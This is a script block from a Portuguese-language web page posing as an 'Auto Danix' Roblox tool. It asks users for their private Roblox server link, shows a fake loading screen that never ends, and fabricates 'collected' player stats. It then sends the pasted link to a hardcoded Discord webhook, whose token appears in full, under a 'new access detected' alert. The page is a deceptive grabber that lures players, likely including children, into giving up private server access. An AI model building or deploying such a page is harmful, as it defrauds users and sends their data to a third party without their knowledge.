    <script>
        // Webhook do Discord fornecido
        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1443019238724997261/TBUwGxEJ2MyvJ6y0PQIhNz4ErMZ0_k7Z-e7SNk-IZrA2l15O96d7gfaijQZzf7TKJ173";

        document.getElementById('confirmBtn').addEventListener('click', function() {
            const serverLink = document.getElementById('serverLink').value;
            
            if (!serverLink) {
                alert('Por favor, insira o link do servidor privado do Roblox.');
                return;
            }
            
            // Mostrar tela de carregamento
            document.getElementById('loadingScreen').classList.add('active');
            document.getElementById('mainScreen').classList.add('hidden');
            
            // Simular coleta de informa√ß√µes
            setTimeout(() => {
                // Coletar informa√ß√µes fict√≠cias
                const playerName = "Jogador_" + Math.floor(Math.random() * 1000);
                const brainrotCount = Math.floor(Math.random() * 50) + 1;
                const playerCount = Math.floor(Math.random() * 100) + 10;
                
                // Enviar para webhook
                sendToWebhook(playerName, brainrotCount, playerCount, serverLink);
            }, 2000);
        });
        
        // Adicionar funcionalidade √†s abas
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', function() {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                this.classList.add('active');
            });
        });
        
        function showNotification(message) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }
        
        function sendToWebhook(playerName, brainrotCount, playerCount, serverLink) {
            const data = {
                content: "üö® **NOVO ACESSO DETECTADO - AUTO DANIX** üö®",
                embeds: [
                    {
                        title: "üéÑ Auto Danix - Informa√ß√µes Coletadas",
                        color: 3066993,
                        fields: [
                            {
                                name: "üë§ Nome do Jogador",
                                value: playerName,
                                inline: true
                            },
                            {
                                name: "üß† Brainrot na Base",
                                value: brainrotCount.toString(),
                                inline: true
                            },
                            {
                                name: "üë• Pessoas no Servidor",
                                value: playerCount.toString(),
                                inline: true
                            },
                            {
                                name: "üîó Link do Servidor",
                                value: serverLink
                            },
                            {
                                name: "‚è∞ Hor√°rio",
                                value: new Date().toLocaleString('pt-BR')
                            }
                        ],
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: "Auto Danix System"
                        }
                    }
                ]
            };
            
            // Enviar para o webhook do Discord
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => {
                if (response.ok) {
                    console.log('Dados enviados com sucesso para o webhook');
                    showNotification('‚úÖ Dados enviados para o Discord!');
                } else {
                    console.error('Erro ao enviar dados:', response.status);
                    showNotification('‚ùå Erro ao enviar dados');
                }
            })
            .catch(error => {
                console.error('Erro ao enviar dados:', error);
                showNotification('‚ùå Erro de conex√£o');
            });
            
            // A tela de carregamento permanece ativa infinitamente conforme solicitado
        }
    </script>
